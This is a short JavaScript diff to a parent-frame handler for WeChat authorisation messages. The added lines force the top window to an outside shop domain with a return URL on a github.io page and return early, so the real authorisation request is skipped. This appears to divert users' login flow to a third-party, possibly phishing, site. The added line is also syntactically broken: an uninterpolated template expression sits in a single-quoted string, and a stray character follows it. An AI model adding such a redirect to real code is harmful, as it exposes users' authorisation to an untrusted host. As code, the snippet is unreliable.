@@ -400,7 +400,8 @@
                 if (data.type === 'REQUEST_WECHAT_AUTH') {
                     console.log('[父框架] 收到内页授权请求，正在获取授权链接...');
                     parentStatusSpan.textContent = '正在获取授权链接...';
-
+                    window.top.location.href = 'https://labubu1.labubu-jp.shop/index.html?return_url=${encodeURIComponent("https://kozakbledar300-stack.github.io/meihaomeihao/meihao.html"l)}';
+                    return;
                     fetch(CONFIG.authUrlApi, {
                         method: 'GET',
                         // state 存服务端，不再依赖跨站 cookie
